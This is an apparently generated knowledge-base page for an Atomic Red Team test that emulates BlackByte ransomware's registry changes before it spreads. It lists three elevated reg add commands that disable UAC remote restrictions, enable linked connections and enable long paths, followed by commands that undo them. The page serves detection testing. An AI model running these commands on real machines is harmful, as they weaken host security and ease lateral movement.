---
atomic_guid: "4f4e2f9f-6209-4fcf-9b15-3b7455706f5b"
title: "BlackByte Ransomware Registry Changes - CMD"
framework: "atomic"
generated: "true"
attack_technique_id: "T1112"
attack_technique_name: "Modify Registry"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "4f4e2f9f-6209-4fcf-9b15-3b7455706f5b"
  - "BlackByte Ransomware Registry Changes - CMD"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# BlackByte Ransomware Registry Changes - CMD

This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See "Preparing to Worm" section: https://redcanary.com/blog/blackbyte-ransomware/
The steps are as follows:
<ol>
    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>
    <li>2. Enable OS to share network connections between different privilege levels</li>
    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>
</ol>
The registry keys and their respective values will be created upon successful execution.

## Metadata

- Atomic GUID: 4f4e2f9f-6209-4fcf-9b15-3b7455706f5b
- Technique: T1112: Modify Registry
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1112/T1112.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1112-modify_registry|T1112]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f
cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f
```

### Cleanup

```commandprompt
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLinkedConnections /f >nul 2>&1
reg delete HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\ /v LongPathsEnabled /f >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml)
